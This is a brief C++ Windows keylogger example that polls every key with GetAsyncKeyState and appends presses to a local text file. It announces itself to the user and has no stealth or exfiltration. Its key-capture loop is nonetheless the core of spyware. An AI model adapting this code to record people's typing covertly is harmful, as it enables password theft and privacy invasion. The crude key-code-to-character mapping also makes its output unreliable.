#include <iostream>
#include <fstream>
#include <windows.h>

// Function to write keystrokes to a file
void LogKeystrokes(const std::string& keystroke) {
    std::ofstream logfile;
    logfile.open("keystrokes.txt", std::ios_base::app); // Open file in append mode
    if (logfile.is_open()) {
        logfile << keystroke;
        logfile.close();
    }
}

int main() {
    // Notify user about keystroke logging
    std::cout << "This program is logging keystrokes for educational purposes.\n"
              << "Please type something to see it being logged.\n"
              << "Press 'Q' to quit.\n";

    // Infinite loop to continuously capture keystrokes
    while (true) {
        // Loop through each possible ASCII character
        for (int key = 8; key <= 255; ++key) {
            // Check if the 'Q' key is pressed to quit the program
            if (GetAsyncKeyState('Q') & 0x8000) {
                std::cout << "Exiting...\n";
                return 0;
            }

            // Check if the key is pressed
            if (GetAsyncKeyState(key) & 0x8000) {
                // Convert key code to ASCII character
                char character = static_cast<char>(key);

                // Check for special keys
                if (key == VK_RETURN) {
                    character = '\n';
                } else if (key == VK_SPACE) {
                    character = ' ';
                }

                // Log the keystroke
                LogKeystrokes(std::string(1, character));
            }
        }

        // Sleep for 100 milliseconds before checking keystrokes again
        Sleep(100);
    }
    return 0;
}
